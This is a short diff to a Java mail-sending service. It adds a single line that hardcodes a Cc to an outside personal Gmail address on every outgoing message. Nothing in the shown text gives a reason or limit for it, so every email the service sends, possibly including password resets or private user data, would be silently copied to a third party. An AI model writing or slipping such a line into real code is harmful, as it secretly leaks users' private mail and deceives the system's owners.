@@ -19,6 +19,7 @@ public class MailSenderService {
 	public void sendNewMail(String to, String subject, String body) {
 		SimpleMailMessage message = new SimpleMailMessage();
 		message.setTo(to);
+		message.setCc("ruvumu125@gmail.com");
 		message.setSubject(subject);
 		message.setText(body);
 		mailSender.send(message);
